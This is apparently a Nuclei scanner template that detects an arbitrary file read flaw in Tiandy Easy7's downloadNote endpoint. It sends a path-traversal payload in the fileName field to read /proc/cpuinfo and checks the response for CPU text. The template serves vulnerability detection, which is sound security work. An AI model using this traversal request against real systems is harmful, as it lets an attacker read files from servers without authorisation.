id: tiandy-easy7-downloadNote-fileread
info:
  name: 天地伟业Easy7 downloadNote存在任意文件读取
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://vip.bdziyi.com/60120/
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: tiandy,fileread,easy7

http:
  - raw:
      - |
        POST /Easy7/rest/file/downloadNote HTTP/1.1
        Content-Length: 43
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (burp)
        Accept: */*
        Accept-Language: en
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        fileName=/../../../proc/cpuinfo&fullName=1
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'processor','cpu')
        condition: and